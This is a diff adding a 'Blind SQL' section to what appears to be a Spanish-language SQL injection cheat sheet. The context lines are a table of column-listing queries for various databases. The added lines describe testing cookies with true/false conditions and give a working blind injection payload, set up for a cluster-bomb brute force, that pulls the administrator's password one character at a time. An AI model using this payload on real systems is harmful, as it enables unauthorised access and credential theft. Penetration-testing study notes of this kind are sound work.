@@ -150,6 +150,10 @@ Ejemplo:
 | Netezza             | `SELECT columnname, datatype FROM _v_relation_column WHERE tablename = 'TABLE';`                    |
 | Clustrix            | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
 
+**Blind SQL**
+- Verificar inyeción en las cookies y verificar su comportamiento con una sentencia Falsa o Verdadero (1=1, 1=0)
+- Identificar posibles tablas y columnas a traves de fuerza bruta
+- Ejecución de un cluster bomb para enumerar datos sensibles `' AND (SELECT substring(password,§1§,1) from users where username = 'administrator')='§x§'--`
 
 
 
